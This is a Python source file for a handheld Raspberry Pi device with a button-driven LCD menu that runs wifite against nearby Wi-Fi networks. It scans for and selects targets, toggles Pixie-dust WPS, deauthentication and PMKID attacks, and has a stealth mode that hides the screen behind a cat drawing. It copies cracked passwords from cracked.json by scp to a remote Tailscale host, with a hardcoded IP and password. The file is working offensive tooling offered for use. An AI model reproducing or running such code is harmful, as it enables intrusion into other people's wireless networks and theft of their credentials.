import RPi.GPIO as GPIO
import setting
from display import (handle_scroll, display_message, display_file_on_lcd, draw_menu, update_progress_bar, draw_progress_bar,
                    exit_stealth_mode, stealth, draw_shadowed_text, disp, draw, font,
                    width, height, current_theme, draw_battery_bar, display_message_with_wrap, display_top, is_stealth_mode_active, image)
from interface_utils import selected_interface, wireless_interfaces, get_wireless_interfaces, check_monitor_mode_and_enable, check_monitor_mode_and_disable
import time
import subprocess
import re
import threading
from essid_utils import ESSIDS, excluded_essid, selected_essid, selected_bssid
from command_utils import build_and_run_command
from setting import state
import json
from wifi_menu import wifi_menu

current_index = 0


def specific_attack_menu(run_command_callback):
    while is_stealth_mode_active():
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    setting.debounce()
    options = [
        {"name": "Pixie", "state": False},
        {"name": "Deauth", "state": False},
        {"name": "PMKID", "state": False},
        {"name": "GO"}
    ]
    active_idx = 0
    total_options = len(options)

    while True:
        draw.rectangle((0, 0, width, height), outline=0, fill=current_theme["background"])
        start_idx = max(0, active_idx - setting.OPTIONS_PER_PAGE + 1)
        end_idx = min(total_options, start_idx + setting.OPTIONS_PER_PAGE)

        # Display selected ESSID at the top
        draw_shadowed_text(draw, f"Selected ESSID: {selected_essid}", (6, 0), font, current_theme["highlight"], current_theme["shadow"])

        for i in range(start_idx, end_idx):
            option = options[i]
            if option["name"] == "GO":
                text = f"> {option['name']}" if i == active_idx else f"  {option['name']}"
            else:
                state = "ON" if option.get("state", False) else "OFF"
                text = f"> {option['name']}: {state}" if i == active_idx else f"  {option['name']}: {state}"
            draw_shadowed_text(draw, text, (6, (i - start_idx + 1) * 10), font, 
                               current_theme["highlight"] if i == active_idx else current_theme["text"], 
                               current_theme["shadow"])

        draw_battery_bar()
        disp.LCD_ShowImage(image, 0, 0)

        active_idx = handle_scroll(active_idx, total_options)

        if GPIO.input(setting.KEY_PRESS_PIN) == GPIO.LOW:
            if options[active_idx]["name"] == "GO":
                # Collect toggle states
                toggle_states = {
                    "pixie": options[0]["state"],
                    "deauth": options[1]["state"],
                    "pmkid": options[2]["state"],
                    "bssid": f"{selected_bssid}"  # Include selected BSSID as part of the toggle states
                }
                # Pass toggle states to the callback
                run_command_callback(toggle_states)
                setting.debounce()
                break  # Exit the menu after running the command
            else:
                # Toggle the state for other options
                options[active_idx]["state"] = not options[active_idx]["state"]
                setting.debounce()

        elif GPIO.input(setting.KEY1_PIN) == GPIO.LOW or GPIO.input(setting.KEY_LEFT_PIN) == GPIO.LOW:  # Exit on KEY1 or KEY_LEFT press
            break


def menu_loop():
    while is_stealth_mode_active():
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    setting.debounce()
    active_idx = 0
    total_options = len(setting.options)

    while True:
        draw_menu(active_idx)

        active_idx = handle_scroll(active_idx, total_options)

        if GPIO.input(setting.KEY_PRESS_PIN) == GPIO.LOW:
            selected_option = setting.options[active_idx]  # Correctly define selected_option
            if selected_option.get("run_on_press"):
                display_message("Showing: cracked.json")
                display_file_on_lcd("/home/sun/cracked.json")
            elif selected_option["name"] == "Quit":
                display_message("Exiting...")
                time.sleep(1)
                disp.LCD_Clear()
                break
            elif selected_option["name"] == "Scan WIFI":  # New option to start scanning
                include_essid()
            elif selected_option["name"] == "Refresh Interfaces":  # New option to refresh interfaces
                refresh_interfaces()
            elif selected_option["name"] == "Scan and Exclude ESSIDs":  # New option to scan and exclude ESSIDs
                exclude_essid()
            else:
                # Toggle option
                toggle_option(active_idx)
            setting.debounce()

        elif GPIO.input(setting.KEY1_PIN) == GPIO.LOW:
            build_and_run_command()
            setting.debounce()

        elif GPIO.input(setting.KEY2_PIN) == GPIO.LOW:  # New condition to display cat drawing
            stealth()
            setting.debounce()

        elif GPIO.input(setting.KEY_LEFT_PIN) == GPIO.LOW:  # Go back to landing menu
            landing_menu()
            setting.debounce()

def landing_menu():
    setting.debounce()
    global selected_interface, wireless_interfaces
    wireless_interfaces = get_wireless_interfaces()
    if len(wireless_interfaces) > 1:
        selected_interface = wireless_interfaces[1]
    else:
        selected_interface = wireless_interfaces[0]
    
    if not wireless_interfaces:
        display_message("No wireless interfaces found!")
        return
        
    if selected_interface is None and wireless_interfaces:
        selected_interface = wireless_interfaces[0]  # Initialize with first available interface

    options = [
        {"name": "Wifite", "action": menu_loop},
        {"name": "Setting", "action": setting_menu},
        {"name": "Show Crack", "action": lambda: display_file_on_lcd("/home/sun/cracked.json")},
        {"name": f"{selected_interface}", "action": toggle_interface},  # Change None to toggle_interface
        {"name": "Refresh Interfaces", "action": refresh_interfaces},
        {"name": "PIXIE QUICK 30", "action": lambda: build_and_run_command(option_name="PIXIE QUICK 30")},
        {"name": "DEAUTH QUICK 120", "action": lambda: build_and_run_command(option_name="DEAUTH QUICK 120")},
        {"name": "SCP Cracked File", "action": scp_cracked_file},
        {"name": "Wi-Fi", "action": wifi_menu}  # New option for Wi-Fi submenu
    ]
    active_idx = 0
    total_options = len(options)

    while True:
        while is_stealth_mode_active():
            exit_stealth_mode()
            time.sleep(0.1)
        draw.rectangle((0, 0, width, height), outline=0, fill=current_theme["background"])
        start_idx = max(0, active_idx - setting.OPTIONS_PER_PAGE + 1)
        end_idx = min(total_options, start_idx + setting.OPTIONS_PER_PAGE)

        for i in range(start_idx, end_idx):
            option = options[i]
            if i == active_idx:
                draw_shadowed_text(draw, f"> {option['name']}", (6, (i - start_idx) * 10), font, current_theme["highlight"], current_theme["shadow"])  # Highlight active option
            else:
                draw_shadowed_text(draw, f"  {option['name']}", (6, (i - start_idx) * 10), font, current_theme["text"], current_theme["shadow"])

        draw_battery_bar()  # Ensure battery bar is drawn
        disp.LCD_ShowImage(image, 0, 0)

        active_idx = handle_scroll(active_idx, total_options)

        if GPIO.input(setting.KEY_PRESS_PIN) == GPIO.LOW:
            options[active_idx]["action"]()
            if options[active_idx]["name"].startswith(str(selected_interface)):
                # Update the displayed interface name after toggling
                options[3]["name"] = str(selected_interface)
            setting.debounce()

def toggle_interface():
    global selected_interface
    if selected_interface is None and wireless_interfaces:
        selected_interface = wireless_interfaces[0]  # Initialize selected_interface if it's None

    current_index = wireless_interfaces.index(selected_interface)
    selected_interface = wireless_interfaces[(current_index + 1) % len(wireless_interfaces)]
    display_message(f"Selected interface: {selected_interface}")
    print(f"Selected interface: {selected_interface}")

def setting_menu():
    setting.debounce()
    active_idx = 0
    total_themes = len(setting.color_themes)

    while True:
        while is_stealth_mode_active():
            exit_stealth_mode()
            time.sleep(0.1)  # Short delay to avoid rapid looping
        draw.rectangle((0, 0, width, height), outline=0, fill=current_theme["background"])
        start_idx = max(0, active_idx - setting.OPTIONS_PER_PAGE + 1)
        end_idx = min(total_themes, start_idx + setting.OPTIONS_PER_PAGE)

        for i in range(start_idx, end_idx):
            theme = setting.color_themes[i]
            if i == active_idx:
                draw_shadowed_text(draw, f"> {theme['name']}", (6, (i - start_idx) * 10), font, current_theme["highlight"], current_theme["shadow"])  # Highlight active option
            else:
                draw_shadowed_text(draw, f"  {theme['name']}", (6, (i - start_idx) * 10), font, current_theme["text"], current_theme["shadow"])

        draw_battery_bar()  # Ensure battery bar is drawn
        disp.LCD_ShowImage(image, 0, 0)

        active_idx = handle_scroll(active_idx, total_themes)

        if GPIO.input(setting.KEY_PRESS_PIN) == GPIO.LOW:
            setting.apply_theme(setting.color_themes[active_idx])
            display_message(f"Theme set to: {setting.color_themes[active_idx]['name']}")
            setting.debounce()
            break

        elif GPIO.input(setting.KEY1_PIN) == GPIO.LOW or GPIO.input(setting.KEY_LEFT_PIN) == GPIO.LOW:  # Exit on KEY1 or KEY_LEFT press
            break

# Handle option toggling and updating command
def toggle_option(selection):
    option = setting.options[selection]

    # Special case for "Select Interface" option
    if option['name'] == "I":
        try:
            current_index = wireless_interfaces.index(option["state"])
        except ValueError:
            current_index = 0  # Default to the first interface if not found
        new_interface = wireless_interfaces[(current_index + 1) % len(wireless_interfaces)]
        option["state"] = new_interface
        global selected_interface  # Update the selected interface globally
        selected_interface = new_interface

        # Update the option name in the landing menu
        for landing_option in setting.options:
            if "Interface:" in landing_option["name"]:
                landing_option["name"] = f"Interface: {selected_interface}"
        print(f"Selected interface: {selected_interface}")

    # Special case for "Scan Time" option
    elif option['name'] == "Scan Time":
        current_index = option["values"].index(option["state"])
        option["state"] = option["values"][(current_index + 1) % len(option["values"])]
        option["command"] = f"-p {option['state']}"

    # Special case for "WPS Time" option
    elif option['name'] == "WPS Time":
        current_index = option["values"].index(option["state"])
        option["state"] = option["values"][(current_index + 1) % len(option["values"])]
        option["command"] = f"--wps-time {option['state']}" if option["state"] != "Off" else ""

    # Special case for "Deauth sec" option
    elif option['name'] == "Deauth sec":
        current_index = option["values"].index(option["state"])
        option["state"] = option["values"][(current_index + 1) % len(option["values"])]
        option["command"] = f"--wpadt {option['state']}" if option["state"] != "Off" else ""

    else:
        # Toggle state for boolean options
        option["state"] = not option["state"]

def toggle_option_by_name(option_name):
    option = next((opt for opt in setting.options if opt["name"] == option_name), None)
    if option:
        toggle_option(setting.options.index(option))
        
def monitor_buttons():
    while True:
        if GPIO.input(setting.KEY2_PIN) == GPIO.LOW:
            state["stealth_mode_active"].set()  # Use set() to activate stealth mode
            stealth()
        time.sleep(0.05)  # Short delay to avoid rapid looping

def essid_selection_menu():
    while is_stealth_mode_active():
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    global selected_essid, selected_bssid, ESSIDS

    if not ESSIDS:
        display_message("No Wi-Fi networks to display")
        time.sleep(3)
        return
    
    active_idx = 0
    total_essids = len(ESSIDS)

    while True:
        draw.rectangle((0, 0, width, height), outline=0, fill=0)
        start_idx = max(0, active_idx - setting.OPTIONS_PER_PAGE + 1)
        end_idx = min(total_essids, start_idx + setting.OPTIONS_PER_PAGE)

        for i in range(start_idx, end_idx):
            essid, bssid = ESSIDS[i]  # Unpacking to get both ESSID and BSSID
            if i == active_idx:
                draw.text((6, (i - start_idx) * 10), f"> {essid}", font=font, fill=(255, 255, 0))  # Highlight active option
            else:
                draw.text((6, (i - start_idx) * 10), f"  {essid}", font=font, fill=(255, 255, 255))

        draw_battery_bar()  # Ensure battery bar is drawn
        disp.LCD_ShowImage(image, 0, 0)

        active_idx = handle_scroll(active_idx, total_essids)

        if GPIO.input(setting.KEY_PRESS_PIN) == GPIO.LOW:
            selected_essid, selected_bssid = ESSIDS[active_idx]  # Store both selected values
            display_message(f"Selected: {selected_essid}, BSSID: {selected_bssid}")
            time.sleep(0.3)
            specific_attack_menu(build_and_run_command)  # Call specific attack menu
            return

def exclude_essid():
    global ESSIDS # Clear previous scan results

    # Scan for Wi-Fi networks
    scan_wifi_networks()

    # Display the ESSID selection menu for toggling exclusion
    essid_selection_menu_for_exclusion()

def include_essid():
    global ESSIDS# Clear previous scan results
    # Scan for Wi-Fi networks
    scan_wifi_networks()
    # Display the ESSID selection menu for inclusion
    essid_selection_menu()

def essid_selection_menu_for_exclusion():
    while is_stealth_mode_active():
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    global ESSIDS, excluded_essid

    if not ESSIDS:
        display_message("No Wi-Fi networks to display")
        return
    
    active_idx = 0
    total_essids = len(ESSIDS)

    while True:
        draw.rectangle((0, 0, width, height), outline=0, fill=0)
        start_idx = max(0, active_idx - setting.OPTIONS_PER_PAGE + 1)
        end_idx = min(total_essids, start_idx + setting.OPTIONS_PER_PAGE)

        for i in range(start_idx, end_idx):
            essid, bssid = ESSIDS[i]
            if i == active_idx:
                color = (0, 255, 0) if essid in excluded_essid else (255, 255, 0)
                draw.text((6, (i - start_idx) * 10), f"> {essid}", font=font, fill=color)
            else:
                color = (0, 255, 0) if essid in excluded_essid else (255, 255, 255)
                draw.text((6, (i - start_idx) * 10), f"  {essid}", font=font, fill=color)

        draw_battery_bar()
        disp.LCD_ShowImage(image, 0, 0)

        active_idx = handle_scroll(active_idx, total_essids)  # handle_scroll already includes debounce

        if GPIO.input(setting.KEY_PRESS_PIN) == GPIO.LOW:
            essid, bssid = ESSIDS[active_idx]
            if essid in excluded_essid:
                excluded_essid.remove(essid)
            else:
                excluded_essid.append(essid)
            setting.debounce()  # Only debounce once after button press

        elif GPIO.input(setting.KEY1_PIN) == GPIO.LOW:  # Exit on KEY1 press
            setting.debounce()
            break

def scan_wifi_networks():
    draw_progress_bar(0.0)
    global ESSIDS, current_index
    ESSIDS.clear()  # Clear previous scan results

    selected_interface_name = selected_interface[0] if isinstance(selected_interface, tuple) else selected_interface
    display_message_with_wrap(f"{selected_interface_name}")

    max_attempts = 2  # Maximum number of scan attempts
    scan_attempts = 0
    check_monitor_mode_and_disable(selected_interface_name)

    while scan_attempts < max_attempts:
        result = subprocess.run(["sudo", "iw", "dev", selected_interface_name, "scan"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        current_bssid = None
        current_essid = None

        for line in lines:
            line = line.strip()
            if line.startswith("BSS") and "(on" in line:  # Detecting BSSID
                current_bssid = line.split()[1].strip().split("(on")[0].strip()  # Remove "(on" part
            elif line.startswith("SSID:"):  # Detecting SSID
                current_essid = line.split("SSID:")[1].strip()
                if current_bssid and current_essid:  # Ensure both BSSID and SSID are present
                    if (current_essid, current_bssid) not in ESSIDS:  # Avoid duplicates
                        ESSIDS.append((current_essid, current_bssid))
                        display_message_with_wrap(f"{current_essid}", append=True)
                        print(f"Found: {current_essid}, {current_bssid}")
                current_bssid = None  # Reset BSSID after processing

        # Update progress based on attempts
        update_progress_bar((scan_attempts + 1) / max_attempts)
        time.sleep(2)  # Add a slight delay between scans to avoid overloading the system

        # If no ESSIDs are found, reset the interface and retry
        scan_attempts += 1
        if not ESSIDS:
            subprocess.run(["sudo", "ifconfig", selected_interface_name, "down"], check=True)
            time.sleep(0.5)
            subprocess.run(["sudo", "ifconfig", selected_interface_name, "up"], check=True)
            time.sleep(0.5)

    if not ESSIDS:
        display_message("No networks found after multiple attempts!")
        time.sleep(3)
    else:
        print("Wi-Fi scan completed.")

# Non-blocking I/O helper to read subprocess output
def read_output_nonblocking(process, output_lines):
    global current_essid, current_mac

    essid_results = {}

    for line in iter(process.stdout.readline, ''):
        output_stripped = line.strip()

        # Display raw output (debugging line, can be removed)
        #display_message_with_wrap(f"Raw Output: {output_stripped}", append=False)
        print({output_stripped})
        # Display ESSID and signal strength while scanning
        essid_scan_match = re.search(r'^\s*\d+\s+(.+?)\s+\d+\s+\S+\s+(\d+db)', output_stripped)
        if essid_scan_match:
            essid_scan = essid_scan_match.group(1).strip()
            signal_strength = essid_scan_match.group(2).strip()
            display_message_with_wrap(f"Scanning: {essid_scan} ({signal_strength})", append=True)
            time.sleep(0.1)

        # Check for "Starting attacks against" message and update ESSID/MAC
        if "Starting attacks against" in output_stripped:
            essid_match = re.search(r'Starting attacks against (.+?) \((.*?)\)$', output_stripped)
            if essid_match:
                #disp.LCD_Clear()
                current_mac = essid_match.group(1).strip()  # Extract mac address
                new_essid = essid_match.group(2).strip()  # Extract essid
                if new_essid != "unknown":
                    current_essid = new_essid
                display_top(f"-> {current_essid}")
                time.sleep(0.2)  # Keep the message on the screen longer

        # Handle output like targets and clients found
        matches = re.findall(r'\x1b\[[0-9;]*m.*?Found.*?\x1b\[[0-9;]*m(\d+).*?target\(s\).*?\x1b\[[0-9;]*m(\d+).*?client\(s\)', output_stripped)
        for match in matches:
            target_count, client_count = match
            output_lines.append(f"{target_count} targets, {client_count} clients")

            # Update display with ESSID and other information
            #display_message_with_wrap(f"-> {current_essid}", append=True, top=True)
            time.sleep(0.1)  # Keep this info on the screen for 2 seconds before continuing

        # Display important lines from wifite output
        if "WPA Handshake" in output_stripped:
            essid_results[current_essid] = "cracked"
            display_message_with_wrap(f"{current_essid} -> cracked", append=True)
            time.sleep(0.1)
        elif "Cracked" in output_stripped:
            if "PSK/Password: N/A" in output_stripped:
                essid_results[current_essid] = "cracked"
                display_message_with_wrap(f"{current_essid} > cracked", append=True)
            else:
                essid_results[current_essid] = "psk"
                display_message_with_wrap(f"{current_essid} > password", append=True)
            time.sleep(0.1)
        elif "Failed" in output_stripped:
            essid_results[current_essid] = "failed"
            display_message_with_wrap(f"{current_essid} > failed", append=True)
            time.sleep(0.1)

def refresh_interfaces():
    global wireless_interfaces, selected_interface, current_index
    wireless_interfaces.clear()  # Clear old interfaces
    wireless_interfaces = get_wireless_interfaces()
    
    if len(wireless_interfaces) > 1:
        selected_interface = wireless_interfaces[1]
    else:
        selected_interface = wireless_interfaces[0]
    
    # Update the "I" option with the new selected interface
    for option in setting.options:
        if option["name"] == "I":
            option["state"] = selected_interface
    
    display_message("Interfaces refreshed")
    draw_menu(current_index)  # Redraw the menu to reflect the changes

import pexpect
from datetime import datetime

def scp_cracked_file():
    try:
        # Start Tailscale
        subprocess.run(["sudo", "tailscale", "up"], check=True)
        display_message_with_wrap("Tailscale started successfully!")

        # Define the destination Tailscale IP, path, and password
        tailscale_ip = "100.108.95.32"  # Replace with your Tailscale IP
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        destination_path = f"/home/sun/crack/{timestamp}.json"
        password = "1120"  # Replace with the actual password

        # SCP command
        command = f"scp /home/sun/cracked.json sun@{tailscale_ip}:{destination_path}"

        # Use pexpect to handle the password prompt
        child = pexpect.spawn(command)
        child.expect("password:")  # Wait for the password prompt
        child.sendline(password)  # Send the password
        child.expect(pexpect.EOF)  # Wait for the command to complete

        display_message_with_wrap("File transferred successfully!")
        time.sleep(1.5)

    except pexpect.exceptions.EOF as e:
        display_message_with_wrap(f"SCP failed: {e}")
    except subprocess.CalledProcessError as e:
        display_message_with_wrap(f"Error: {e}")
    except Exception as e:
        display_message_with_wrap(f"Unexpected error: {e}")
    finally:
        # Stop Tailscale
        try:
            subprocess.run(["sudo", "tailscale", "down"], check=True)
            display_message_with_wrap("Tailscale stopped successfully!")
        except subprocess.CalledProcessError as e:
            display_message_with_wrap(f"Error stopping Tailscale: {e}")
